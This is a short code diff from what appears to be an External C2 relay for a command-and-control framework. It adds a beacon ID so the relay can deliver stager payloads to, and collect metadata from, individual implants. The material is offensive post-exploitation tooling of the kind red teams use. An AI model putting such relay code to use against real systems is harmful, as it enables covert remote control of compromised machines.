@@ -30,7 +30,7 @@ def requestStager(sock):
 
 	return stager_payload
 
-def loadStager(sock):
+def loadStager(sock, beaconId):
 	# Send options to the external_c2 server
 	configureOptions(sock, config.C2_ARCH, config.C2_PIPE_NAME, config.C2_BLOCK_TIME)
 
@@ -51,12 +51,12 @@ def loadStager(sock):
 	# Send stager to the client
 	if config.verbose:
 		print commonUtils.color("Sending stager to client")
-	commonUtils.sendData(stager_payload)
+	commonUtils.sendData(stager_payload, beaconId)
 
 	# Rrieve the metadata we need to relay back to the server
 	if config.verbose:
 		print commonUtils.color("Awaiting metadata response from client")
-	metadata = commonUtils.retrieveData()
+	metadata = commonUtils.retrieveData(beaconId)
 
 	# Send the metadata frame to the external_c2 server
 	if config.verbose:
